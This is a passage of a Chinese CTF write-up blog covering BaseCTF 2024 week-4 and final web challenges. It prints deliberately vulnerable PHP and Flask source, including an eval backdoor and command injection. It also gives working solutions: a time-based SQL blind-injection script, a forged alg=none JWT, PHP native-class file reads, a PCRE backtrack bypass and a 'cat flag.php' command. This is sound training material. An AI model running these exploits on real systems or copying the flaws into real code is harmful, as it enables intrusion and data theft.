class="hljs-string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>, <span class="hljs-string">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>,<br>    <span class="hljs-string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="hljs-string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,<br>    <span class="hljs-string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="hljs-string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>,<br>    <span class="hljs-string">&quot;072b030ba126b2f4b2374f342be9ed44&quot;</span>, <span class="hljs-string">&quot;f457c545a9ded88f18ecee47145a72c0&quot;</span>,<br>    <span class="hljs-string">&quot;698d51a19d8a121ce581499d7b701668&quot;</span>, <span class="hljs-string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,<br>    <span class="hljs-string">&quot;9a1158154dfa42caddbd0694a4e9bdc8&quot;</span>, <span class="hljs-string">&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;</span>,<br>    <span class="hljs-string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class="hljs-string">&quot;072b030ba126b2f4b2374f342be9ed44&quot;</span>,<br>    <span class="hljs-string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span class="hljs-string">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>,<br>    <span class="hljs-string">&quot;5ef059938ba799aaa845e1c2e8a762bd&quot;</span>, <span class="hljs-string">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>,<br>    <span class="hljs-string">&quot;a5771bce93e200c36f7cd9dfd0e5deaa&quot;</span>, <span class="hljs-string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,<br>    <span class="hljs-string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class="hljs-string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>,<br>    <span class="hljs-string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span>, <span class="hljs-string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>,<br>    <span class="hljs-string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class="hljs-string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>,<br>    <span class="hljs-string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span>, <span class="hljs-string">&quot;069059b7ef840f0c74a814ec9237b6ec&quot;</span>,<br>    <span class="hljs-string">&quot;f7177163c833dff4b38fc8d2872f1ec6&quot;</span>, <span class="hljs-string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,<br>    <span class="hljs-string">&quot;c74d97b01eae257e44aa9d5bade97baf&quot;</span>, <span class="hljs-string">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>,<br>    <span class="hljs-string">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>, <span class="hljs-string">&quot;02e74f10e0327ad868d138f2b4fdd6f0&quot;</span>,<br>    <span class="hljs-string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="hljs-string">&quot;7cbbc409ec990f19c78c75bd1e06f215&quot;</span>,<br>    <span class="hljs-string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="hljs-string">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,<br>    <span class="hljs-string">&quot;ad61ab143223efbc24c7d2583be69251&quot;</span>, <span class="hljs-string">&quot;6ea9ab1baa0efb9e19094440c317e21b&quot;</span>,<br>    <span class="hljs-string">&quot;d1fe173d08e959397adf34b1d77e88d7&quot;</span>, <span class="hljs-string">&quot;d1fe173d08e959397adf34b1d77e88d7&quot;</span>,<br>    <span class="hljs-string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span><br>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">45</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span>(md5(<span class="hljs-built_in">str</span>(c^i).encode()).hexdigest()==enc[i]):<br>            flag+=<span class="hljs-built_in">chr</span>(c)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<p>代码自行修改就可以得到flag了</p>
<h1 id="week4"><a class="markdownIt-Anchor" href="#week4"></a> week4</h1>
<h2 id="web-4"><a class="markdownIt-Anchor" href="#web-4"></a> web</h2>
<h3 id="flag直接读取不就行了"><a class="markdownIt-Anchor" href="#flag直接读取不就行了"></a> flag直接读取不就行了？</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$J1ng</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br><span class="hljs-variable">$Hong</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>];<br><span class="hljs-variable">$Keng</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;K&#x27;</span>];<br><span class="hljs-variable">$Wang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;W&#x27;</span>];<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Keng</span>(<span class="hljs-variable">$Wang</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$J1ng</span>(<span class="hljs-variable">$Hong</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>读取目录可以利用<code>DirectoryIterator</code>进行读取，逐层遍历得到具体位置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?K=DirectoryIterator&amp;W=../../../secret<br></code></pre></td></tr></table></figure>
<p>然后post读取就可以得到flag了，需要看源码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">J=SplFileObject&amp;H=../../../secret/f11444g.php<br></code></pre></td></tr></table></figure>
<h3 id="圣钥之战10"><a class="markdownIt-Anchor" href="#圣钥之战10"></a> 圣钥之战1.0</h3>
<p>考察python原型链的知识，以前没写过刚好帮我入了门，先上源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_json</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        json.loads(data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/static/index.html&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Read</span>():<br>    file = <span class="hljs-built_in">open</span>(__file__, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;J1ngHong说：你想read flag吗？</span><br><span class="hljs-string">那么圣钥之光必将阻止你！</span><br><span class="hljs-string">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="hljs-string"><span class="hljs-subst">&#123;file&#125;</span></span><br><span class="hljs-string">&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pollute&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pollution</span>():<br>    <span class="hljs-keyword">if</span> request.is_json:<br>        merge(json.loads(request.data),instance)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>
<p>原理先按下不表，之后会出一篇文章学习一下原型链，主要是先写题目。大致就是利用merge函数来修改父类的属性</p>
<p>思路是利用/read下的<code>__file__</code>进行读取flag，想要利用这个，需要通过/pollute的传参就是污染，用merge对这个进行修改，同时<code>__file__</code>变量是一个全局值，就可以用上面写到的<code>__globals__</code>函数来获取全局变量并进行修改</p>
<p><img src="/../../images/basectf/basectf2024/zhan1.png" srcset="/img/loading.gif" lazyload alt="zhan1"></p>
<p>注意的是需要添加头，否则不能读取成功<code>Content-Type: application/json</code></p>
<p>之后在/read刷新一下就出flag了，不能理解的看一下代码原理。</p>
<p><img src="/../../images/basectf/basectf2024/zhan2.png" srcset="/img/loading.gif" lazyload alt="zhan2"></p>
<h3 id="only-one-sql"><a class="markdownIt-Anchor" href="#only-one-sql"></a> only one sql</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-comment">//flag in ctf.flag</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>);<br></code></pre></td></tr></table></figure>
<p>首先执行<code>show databases</code>爆库看看，再执行爆表</p>
<p><img src="/../../images/basectf/basectf2024/sql1.png" srcset="/img/loading.gif" lazyload alt="sql1"></p>
<p>猜测应该在flag里，执行一下爆列<code>show columns from flag</code></p>
<p><img src="/../../images/basectf/basectf2024/sql2.png" srcset="/img/loading.gif" lazyload alt="sql2"></p>
<p>猜测在data里面，题目把正常的select给过滤了，提醒了盲注，本人sql其实不算擅长，根据官p来吧，正常的flag格式是B来头，我们可以利用delete和时间盲注进行探测，比如</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=delete from flag <span class="hljs-built_in">where</span> data like <span class="hljs-string">&#x27;B%&#x27;</span> and <span class="hljs-built_in">sleep</span>(5)<br></code></pre></td></tr></table></figure>
<p><code>DELETE FROM flag</code>：从 <code>flag</code> 表中删除记录。<code>WHERE data LIKE 'B%'</code>：条件为 <code>data</code> 字段的值以字母 <code>B</code> 开头的记录会被选中。检测是否有B开头的.<code>SLEEP(5)</code> 会让数据库等待 5 秒再继续执行。最后写个脚本等慢慢跑出来就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>char = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> char:<br>        url = <span class="hljs-string">f&#x27;http://challenge.basectf.fun:28963/?sql=delete%20from%20flag%20where%20data%20like%20%27<span class="hljs-subst">&#123;flag&#125;</span><span class="hljs-subst">&#123;c&#125;</span>%25%27%20and%20sleep(5)&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            response = requests.get(url, timeout=<span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>            <span class="hljs-built_in">print</span>(flag + c)  <span class="hljs-comment"># 输出已猜出的 flag 部分</span><br>            flag += c  <span class="hljs-comment"># 将正确的字符加入 flag</span><br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 进入下一个字符的猜测</span><br></code></pre></td></tr></table></figure>
<h3 id="no-jwt"><a class="markdownIt-Anchor" href="#no-jwt"></a> No JWT</h3>
<p>和平常写的jwt有点不太一样</p>
<p>接口需要一个包含角色为 <code>admin</code> 的 JWT 令牌才能返回 flag。为了得到 flag，需要伪造一个 JWT 令牌，绕过服务器端的角色检查。</p>
<p>签名验证已被禁用，可以伪造一个 JWT 令牌，其中 <code>role</code> 设置为 <code>admin</code>。接下来就是构造这个伪造的 JWT 令牌并发送请求到 <code>/flag</code> 接口。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><br>flag_url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:30617/flag&#x27;</span> <br><br>header = &#123;<br>    <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,  <span class="hljs-comment"># 禁用签名验证</span><br>    <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>payload = &#123;<br>    <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <br>    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,  <span class="hljs-comment"># 设置为 admin</span><br>    <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">9999999999</span>  <span class="hljs-comment"># 过期时间设置在未来</span><br>&#125;<br><span class="hljs-comment"># 对 header 和 payload 进行 Base64 编码</span><br>header_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip(<span class="hljs-string">&quot;=&quot;</span>)<br>payload_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip(<span class="hljs-string">&quot;=&quot;</span>)<br><br>fake_jwt = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;header_enc&#125;</span>.<span class="hljs-subst">&#123;payload_enc&#125;</span>.&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">f&#x27;Bearer <span class="hljs-subst">&#123;fake_jwt&#125;</span>&#x27;</span><br>&#125;<br><br>response = requests.get(flag_url, headers=headers)<br><br><span class="hljs-comment"># 打印服务器响应</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;服务器响应状态码:&quot;</span>, response.status_code)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;服务器响应内容:&quot;</span>, response.text)<br></code></pre></td></tr></table></figure>
<h1 id="fin"><a class="markdownIt-Anchor" href="#fin"></a> Fin</h1>
<h2 id="web-5"><a class="markdownIt-Anchor" href="#web-5"></a> web</h2>
<h3 id="1z_php"><a class="markdownIt-Anchor" href="#1z_php"></a> 1z_php</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我记得她...好像叫flag.php吧？</span><br><span class="hljs-variable">$emp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e_m.p&#x27;</span>];<br><span class="hljs-variable">$try</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;try&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$emp</span>!=<span class="hljs-string">&quot;114514&quot;</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$emp</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">114514</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$emp</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$emp</span>[<span class="hljs-variable">$i</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你不是hacker？那请去外场等候！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="hljs-variable">$try</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你是hacker还敢自报家门呢？&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$try</span>,<span class="hljs-string">&#x27;HACKER&#x27;</span>) === <span class="hljs-literal">TRUE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;114514到底是啥意思嘞？。？&quot;</span>);<br>&#125;<br><span class="hljs-comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>第一层对emp进行传值，用小数点就可以绕过，注意php特性</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">e[m.p=114514.111<br></code></pre></td></tr></table></figure>
<p>第二层非贪婪绕过，可以去看看p神的文章，了解一下原理，<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#:~:text=PHP%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E6%AD%A3">PHP利用PCRE回溯次数限制绕过某些安全限制</a>,只需要给HACKER前面加100w个就行了(ps：我没测最小值需要多少，直接量大管饱了)post发包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>+ <span class="hljs-string">b&#x27;HACKER&#x27;</span><br><br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
<p>第三层进行原生类的读取，简要的介绍gpt来写</p>
<p><code>SplFileObject</code> 是 PHP 的一个内置类，继承自 <code>SplFileInfo</code>，用于处理文件的读写操作。它提供了许多方法来操作文件，类似于文件处理的面向对象接口。</p>
<p>使用 <code>SplFileObject</code> 的常见方法：</p>
<ul>
<li><strong><code>fgets()</code></strong>: 读取文件的一行。</li>
<li><strong><code>fwrite()</code></strong>: 写入内容到文件。</li>
<li><strong><code>fgetc()</code></strong>: 读取文件的一个字符。</li>
</ul>
<p><code>php://stdin</code> 是一个 PHP 的流包装器，表示标准输入流。这通常用于从命令行或其他输入流读取数据。</p>
<ul>
<li><strong><code>php://stdin</code></strong> 允许你读取从标准输入传入的数据，例如，通过命令行管道传递的数据。</li>
</ul>
<p><code>fgets()</code> 是 <code>SplFileObject</code> 提供的一个方法，用于从文件中读取一行。结合 <code>php://stdin</code>，它可以读取从标准输入传入的数据。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=SplFileObject&amp;b=php://stdin&amp;c=fgets<br></code></pre></td></tr></table></figure>
<p>最后在post后面执行<code>system('cat flag.php');</code>就可以得到flag，看源码</p>
<h3 id="ez_php"><a class="markdownIt-Anchor" href="#ez_php"></a> ez_php</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 